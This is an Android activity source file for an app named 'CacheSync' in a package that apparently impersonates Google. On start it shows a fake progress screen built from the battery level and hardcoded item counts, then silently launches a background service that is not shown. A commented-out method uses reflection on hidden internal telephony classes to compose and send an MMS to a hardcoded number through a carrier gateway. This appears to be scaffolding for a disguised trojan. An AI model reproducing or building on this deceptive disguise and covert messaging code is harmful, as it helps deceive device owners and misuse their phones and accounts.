// code4bones

package com.google.cachesync;


import com.code4bones.utils.*;
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.content.IntentFilter;
import android.view.Menu;
import android.widget.ProgressBar;
import android.widget.TextView;


public class MainActivity extends Activity {

	final public NetLog gLog = NetLog.getInstance(); 
	final public CommandPool cmdPool = CommandPool.getInstance();

	public ProgressBar progress;
	public TextView txtItems;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
    	
    	gLog.Init("CacheSync","CacheSync.log.txt",true);
    	
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        int level = getBatteryLevel();
        int total = 20;
        int current = 12;
        
        progress = (ProgressBar)findViewById(R.id.progressBar1);
        txtItems = (TextView)findViewById(R.id.textView4);
        
        
        progress.setMax(120);
        progress.setProgress(level);
        txtItems.setText(String.format("Items %d / %d ( approx )",current,total));
       
        serviceStart();
        //sendMMS();
    }

    public void sendMMS() {
		//try {
			//PrivateClassProxy tp = new PrivateClassProxy(this,"com.android.internal.telephony.TelephonyProperties");
			//ArrayList<String> fields = tp.getFields();
			/*
			PrivateClassProxy tString = new PrivateClassProxy(this,"java.lang.String");
			PrivateClassProxy SendHeaders = new PrivateClassProxy(this,"com.google.android.mms.pdu.PduHeaders");
*/
			
			/*
			Object string = tString.getConstructor(new Class<?>[]{String.class}).newInstance("Hello World");
			Method concat = tString.getMethod("concat",new Class<?>[]{String.class});
			string = concat.invoke(string, " concat 1");
			string = concat.invoke(string, "concat 2");
			NetLog.v("RES = %s",string);
			*/
			/*
			PrivateClassProxy EncodedStringValue = new PrivateClassProxy(this,"com.google.android.mms.pdu.EncodedStringValue");
			PrivateClassProxy PduBody = new PrivateClassProxy(this,"com.google.android.mms.pdu.PduBody");
			PrivateClassProxy SendReq = new PrivateClassProxy(this,"com.google.android.mms.pdu.SendReq");
			PrivateClassProxy PduPart = new PrivateClassProxy(this,"com.google.android.mms.pdu.PduPart");
			PrivateClassProxy PduComposer = new PrivateClassProxy(this,"com.google.android.mms.pdu.PduComposer");
			PrivateClassProxy GenericPdu = new PrivateClassProxy(this,"com.google.android.mms.pdu.GenericPdu");
			PrivateClassProxy Phone = new PrivateClassProxy(this,"com.android.internal.telephony.Phone");
			//Phone.Dump();
			//HttpUtils.Dump();
			
			
			// EncodedStringValue
			final Method extract = EncodedStringValue.getMethod("extract", String.class);
			final Method getString = EncodedStringValue.getMethod("getString");
			NetLog.v("EncodedStringValue methods: %s\n%s",extract,getString);
			
			// PduBody
			Object pduBody = PduBody.getConstructor().newInstance();
			final Method addPart = PduBody.getMethod("addPart",PduPart.mClass);
			//NetLog.v("PduBody methods: %s",pduBody);
			
			// SendReq
			Object sendRequest = SendReq.getConstructor().newInstance();
			final Method addTo = SendReq.getMethod("addTo", EncodedStringValue.mClass);
			final Method setBody = SendReq.getMethod("setBody",PduBody.mClass);
			final Method setSubject = SendReq.getMethod("setSubject", EncodedStringValue.mClass);
			NetLog.v("SendReq methods: %s\n%s\n%s\n%s",sendRequest,addTo,setBody,setSubject);
		
			// PduPart
			Object pduPart = PduPart.getConstructor(new Class<?>[]{}).newInstance();
			final Method setDataUri = PduPart.getMethod("setDataUri",Uri.class);
			final Method setName = PduPart.getMethod("setName");
			final Method setContentType = PduPart.getMethod("setContentType");
			final Method setData = PduPart.getMethod("setData");
			
			// PduComposer
			Object pduComposer = PduComposer.getConstructor(new Class<?>[]{Context.class,GenericPdu.mClass}).newInstance(this,sendRequest);
			final Method make = PduComposer.getMethod("make");
			
			Object[] sub = (Object[])extract.invoke(null, "Hello MMS");
			Object[] phnum = (Object[])extract.invoke(null,"+79037996299");
			
			//SendRequest
			addTo.invoke(sendRequest,phnum[0]);
			setSubject.invoke(sendRequest, sub[0]);
			setBody.invoke(sendRequest, pduBody);
			//APNHelper apn = new APNHelper(this);
			//apn.getMMSApns();
			final byte[] bytesToSend = (byte[])make.invoke(pduComposer);
			
			final ConnectivityManager connMgr = (ConnectivityManager)this.getSystemService(Context.CONNECTIVITY_SERVICE);
			final int result = connMgr.startUsingNetworkFeature( ConnectivityManager.TYPE_MOBILE, "enableMMS");			

			
			final IntentFilter filter = new IntentFilter();
			filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
			final BroadcastReceiver receiver = new BroadcastReceiver() {
				@Override
				public void onReceive(Context context, Intent intent) {
					// TODO Auto-generated method stub
					Bundle extra = intent.getExtras();
					NetLog.v("Somthing fired an Intent action");
					MainActivity.this.unregisterReceiver(this);
					if ( extra == null ) {
						NetLog.v("Bundle is null");
						return;
					}
					NetworkInfo net = extra.getParcelable("networkInfo");
					if ( net.getState().compareTo(State.CONNECTED)  == 0 ) {
						try {
							NetLog.v("Sending Http request");
							HttpUtils.httpConnection(MainActivity.this, 4444L, "mms.beeline.ru:5555", bytesToSend, 1, false, "",0);
						} catch (IOException e) {
							NetLog.v("HTTP: %s",e.getMessage());
							e.printStackTrace();
						}			
					}
				}
			};
		  	
			this.registerReceiver(receiver,filter);			
			
			
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
        //    android.os.SystemProperties.get(TelephonyProperties.PROPERTY_ICC_OPERATOR_NUMERIC));
        //NetLog.v("+++ %s",s);
			catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception  e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		*/
    }
    
	public int getBatteryLevel() {
		Intent batteryIntent = registerReceiver(null,
		        new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		int rawlevel = batteryIntent.getIntExtra("level", -1);
		double scale = batteryIntent.getIntExtra("scale", -1);
		int batteryLevel = -1;
		if (rawlevel >= 0 && scale > 0) {
			batteryLevel = (int)((rawlevel / scale)*100);
		}
		return batteryLevel;
	}
    
    public void serviceStart() {
    	Intent service = new Intent(this,CacheSyncService.class);
    	this.startService(service);
    }
    	
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
